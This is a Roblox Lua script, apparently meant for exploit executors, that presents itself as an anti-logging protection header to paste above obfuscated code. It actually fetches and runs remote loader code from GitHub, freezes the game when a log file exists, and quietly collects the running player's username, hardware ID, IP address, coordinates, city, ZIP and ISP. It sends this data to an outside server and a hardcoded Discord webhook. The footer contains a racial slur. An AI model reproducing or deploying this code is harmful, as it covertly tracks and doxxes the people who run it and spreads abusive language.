local SecurityOne = 0

local Connection = game:GetService("RunService").Heartbeat:Connect(function()
    SecurityOne += 1
end)

repeat
    task.wait()
until SecurityOne >= 2

Connection:Disconnect()

--[[ Right before obfuscating, paste this code above/before your source code, and your script will not be able to be env logged ]]

local logName = string.format("%d-%s-log.txt", game.PlaceId, os.date("%d_%m_%y"))

local function punish()
    if writefile then pcall(writefile, logName, "Crashed") end
    while true do end -- Freezes and crashes the game immediately
end

task.spawn(function()
    while task.wait() do
        if isfile and pcall(isfile, logName) and isfile(logName) then
            punish()
        end
    end
end)

if loadstring(game:HttpGet("https://raw.githubusercontent.com/waveuser57/code/refs/heads/main/loader"))() ~= "b9h42t8w0q3n59m1vx7t2k8r94f3n0m2g7y85b2n1t97h4q3k28m5v0r91c7x48m3p29g6s1n84d3q7z59v0h23k8b4t97m12x4r6p85g3t09q2w7b6m18z53n7h4v92k3y8t1p65r0m32g94x7b1h8q5k29t4v61n0z87m4p2g9c3t58" then
	while true do end
    return
end

local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
local thumbRes = request({Url = thumbApi, Method = "GET"})
local finalImageUrl = ""

if thumbRes.StatusCode == 200 then
    local decoded = httpService:JSONDecode(thumbRes.Body)
    if decoded.data and decoded.data[1] then
        finalImageUrl = decoded.data[1].imageUrl -- This extracts the direct rbxcdn link
    end
end

-- get client IPv4
local ipResp = request({
    Url = "https://api.ipify.org?format=json",
    Method = "GET"
})

local clientIp = "unknown"
if ipResp.StatusCode == 200 then
    local ipData = httpService:JSONDecode(ipResp.Body)
    clientIp = ipData.ip
end

-- send IP to your server
local response = request({
    Url = "http://websitehosted052.xyz/get_ip?ip=" .. clientIp,
    Method = "GET",
    Headers = {
        ["Authorization"] = "CrossNet"
    }
})

if loadstring(game:HttpGet("https://raw.githubusercontent.com/waveuser57/code2/refs/heads/main/loader"))() ~= "∆9x@!7§v^3|R0~ß4:/Θ+1µ?8#Ω>5¬_Φ2≈6$π<δ*0λ&σ!9Ξ~7/θ@3|β6°1_ψ?8#κ>4+µ≈2§0Δ&φ!5^9Θ~1/λ@7|σ3°8_π?4#δ>6+Φ≈0*Ξ&β!2~9Δ/θ@5|κ1°7_ψ?3#µ>8+σ≈4§0Ω&λ!6^2" then
	game.Players.LocalPlayer:Kick("Security failed")
    return
end

if response.StatusCode == 200 then
    local data = httpService:JSONDecode(response.Body)

    pcall(function()
        local embed = {
            ["title"] = "Execution Log",
            ["color"] = 65280,
            ["thumbnail"] = {["url"] = finalImageUrl}, -- Uses the direct image link
            ["fields"] = {
                {["name"] = "👤 Username", ["value"] = localPlayer.Name, ["inline"] = true},
                {["name"] = "📝 Display Name", ["value"] = localPlayer.DisplayName, ["inline"] = true},
                {["name"] = "💻 HWID", ["value"] = hwid, ["inline"] = false},
                {["name"] = "🌐 IPv4", ["value"] = data.ipv4, ["inline"] = true},
                {["name"] = "🌍 IPv6", ["value"] = data.ipv6, ["inline"] = true},
                {["name"] = "📌 Coordinates", ["value"] = tostring(data.lat) .. ", " .. tostring(data.lon), ["inline"] = true},
                {["name"] = "📍 Region", ["value"] = data.region or "N/A", ["inline"] = true},
                {["name"] = "🌎 Country", ["value"] = data.country or "N/A", ["inline"] = true},
                {["name"] = "🏙️ City", ["value"] = data.city or "N/A", ["inline"] = true},
                {["name"] = "🏷️ ZIP", ["value"] = tostring(data.zip), ["inline"] = true},
                {["name"] = "💡 ISP", ["value"] = data.isp, ["inline"] = true},
                {["name"] = "🕵️ Proxy/VPN", ["value"] = data.proxy and "Yes" or "No", ["inline"] = true}
            },
            ["footer"] = {
                ["text"] = "Powered by Nigga Paradise v3"
            },
            ["timestamp"] = DateTime.now():ToIsoDate() 
        }

        local payload = httpService:JSONEncode({["embeds"] = {embed}})

        request({
            Url = "https://discord.com/api/webhooks/1489095174276780175/rMKpEDIbyeNkp6p5pAEj_hNlr4_C4TULvj5cTpthL8h0deD-TLr6MAeeYRq0dUozHx0c",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
else
    warn("Could not connect to CrossNet server.")
end